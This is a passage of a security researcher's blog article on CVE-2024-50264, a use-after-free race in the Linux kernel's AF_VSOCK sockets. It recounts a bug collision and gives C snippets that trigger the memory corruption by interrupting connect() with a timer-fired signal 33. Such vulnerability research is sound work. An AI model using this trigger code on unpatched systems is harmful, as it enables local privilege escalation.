---
title: Kernel-hack-drill and a new approach to exploiting CVE-2024-50264 in the Linux kernel
url: https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html
source: Alexander Popov
date: 2025-09-03
fetch_date: 2025-10-02T19:33:09.484788
---

# Kernel-hack-drill and a new approach to exploiting CVE-2024-50264 in the Linux kernel

[![](/img/favicons/a13xp0p0v_ava.png) Alexander Popov](/)
[ ]

[About](/about/)[Articles](/articles/)[Conference Talks](/conference_talks/)

# Kernel-hack-drill and a new approach to exploiting CVE-2024-50264 in the Linux kernel

Sep 2, 2025

Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project [kernel-hack-drill](https://github.com/a13xp0p0v/kernel-hack-drill) and show how it helped me to exploit CVE-2024-50264.

## Bug collision story

I first found a bug in `AF_VSOCK` back in 2021 and published the article [Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html). In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in `AF_VSOCK`. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (`kworker`), which didn't look security-relevant. Patching it properly would require significant rework in the `AF_VSOCK` subsystem. Convinced the path forward would be painful, I shelved the crash. This was a wrong decision.

Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I'd collided with Hyunwoo Kim ([@v4bel](https://x.com/v4bel)) and Wongi Lee ([@qwerty](https://x.com/_qwerty_po)): they'd already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. [Their patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/vmw_vsock?id=6ca575374dd9a507cdd16dfa0e78c2e9e20bd05f) turned my PoC exploit into a null-ptr-deref:

![](/img/vsock_patch.png)

Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.

![](/img/Vityaz.jpg)
Viktor Vasnetsov: Vityaz at the Crossroads (1882)

The [exploit strategy](https://github.com/google/security-research/pull/145/files) by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.

## CVE-2024-50264 analysis

The vulnerability [CVE-2024-50264](https://nvd.nist.gov/vuln/detail/CVE-2024-50264) was introduced in August 2016 by commit [06a8fc78367d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/vmw_vsock?id=06a8fc78367d070720af960dcecec917d3ae5f3b) in Linux v4.8. It is a race condition in `AF_VSOCK` sockets that happens between the `connect()` system call and a POSIX signal, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.

The kernel uses a freed `virtio_vsock_sock` object. Its size is 80 bytes, which is suitable for the `kmalloc-96` slab cache. The memory corruption is a UAF write executed by a kernel worker.

However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that **it's the worst bug to exploit I've ever seen**. The Pwnie Award is well-deserved. I'll outline those constraints shortly.

## Reproducing the bug using an "immortal signal"

First, an attacker should create a listening virtual socket (server vsock):

```
int ret = -1;
int vsock1 = 0;

vsock1 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock1 < 0)
	err_exit("[-] creating vsock");

ret = bind(vsock1, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));
if (ret != 0)
	err_exit("[-] binding vsock");

ret = listen(vsock1, 0); /* backlog = 0 */
if (ret != 0)
	err_exit("[-] listening vsock");
```

Then the attacker should try to open a connection from a client vsock:

```
#define UAF_PORT 0x2712

int vsock2 = 0;
struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_LOCAL
};

vsock2 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock2 < 0)
	err_exit("[-] creating vsock");

ret = connect(vsock2, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));
```

To trigger the bug, the attacker should interrupt this `connect()` system call with a POSIX signal. @v4bel & @qwerty used `SIGKILL`, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:

```
struct sigevent sev = {};
timer_t race_timer = 0;

sev.sigev_notify = SIGEV_SIGNAL;
sev.sigev_signo = 33;
ret = timer_create(CLOCK_MONOTONIC, &sev, &race_timer);
```

My fuzzer discovered that a timer can fire signal 33 and interrupt `connect()`. Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As `man 7 nptl` explains:

> NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33).
> One of these signals is used to support thread cancellation and POSIX timers (see `timer_create(2)`);
> the other is used as part of a mechanism that ensures all threads in a process always have
> the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.

True, these signals cannot be used in applications, but they are perfect for my exploit ðŸ˜‰

![](/img/secret.jpeg)

I use `timer_settime()` for `race_timer`, which lets me choose the exact moment signal 33 interrupts `connect()`. Moreover, the signal is invisible to the exploit process and doesn't kill it.

## About memory corruption

The race condition succeeds when a signal interrupts the `connect()` system call while the vulnerable socket is in the `TCP_ESTABLISHED` state. The socket then [drops into](https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/af_vsock.c#L1475) the `TCP_CLOSING` state:

```
if (signal_pending(current)) {
	err = sock_intr_errno(timeout);
	sk->sk_state = sk->sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
	sock->state = SS_UNCONNECTED;
	vsock_transport_cancel_pkt(vsk);
	vsock_remove_connected(vsk);
	goto out_wait;
}
```

The second attempt to connect the vulnerable vsock to the server vsock using a different `svm_cid` (`VMADDR_CID_HYPERVISOR`) provokes memory corruption.

```
struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_HYPERVISOR
};

/* this connect will schedule the kernel worker performing UAF */
ret = connect(vsock2, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));
```

Under the hood, the `connect()` system call [executes](https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/af_vsock.c#L439) `vsock_assign_transport()`. This function switches the virtual socket to the new `svm_cid` transport and frees the resources tied to the previous vsock transport:

```
if (vsk->transport) {
	if (vsk->transport == new_transport)
		return 0;

	/* transport->release() must be called with sock lock acquired.
	 * This path can only be taken during vsock_connect(), where we
	 * have already held the sock lock. In the other cases, this
	 * function is called on a new socket which is not assigned to
	 * any transport.
	 */
	vsk->transport->release(vsk);
	vsock_deassign_transport(vsk);
}
```

This procedure [closes](https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1214) the old vsock transport in `virtio_transport_close()` and [frees](https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1085) the `virtio_vsock_sock` object in `virtio_transport_destruct()`. However, due to the erroneous `TCP_CLOSING` state of the socket, `virtio_transport_close()` initiates further communication. To handle that activity, the kernel schedules a `kworker` that eventually call...